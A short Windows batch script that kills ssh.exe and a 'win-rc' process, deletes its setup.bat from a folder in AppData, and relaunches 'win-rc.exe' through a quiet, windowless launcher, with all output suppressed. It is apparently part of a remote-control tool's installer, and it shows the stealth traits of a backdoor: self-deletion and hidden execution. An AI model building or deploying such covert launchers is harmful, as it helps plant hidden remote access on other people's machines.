@echo off
taskkill /IM "ssh.exe" /F >nul 2>&1
taskkill /IM "win-rc.exe" /F >nul 2>&1
cd %appdata%\win-rc\ >nul 2>&1
del setup.bat >nul 2>&1
bin\Quiet\Quiet.exe win-rc.exe >nul 2>&1